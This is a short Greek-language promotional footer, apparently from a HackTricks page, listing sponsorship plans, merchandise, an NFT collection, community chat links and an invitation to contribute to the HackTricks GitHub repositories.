* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [επίσημο PEASS & HackTricks swag](https://peass.creator-spring.com)
* Ανακαλύψτε [την Οικογένεια PEASS](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [NFTs](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [ομάδα Discord](https://discord.gg/hRep4RUj7f) ή στη [ομάδα telegram](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
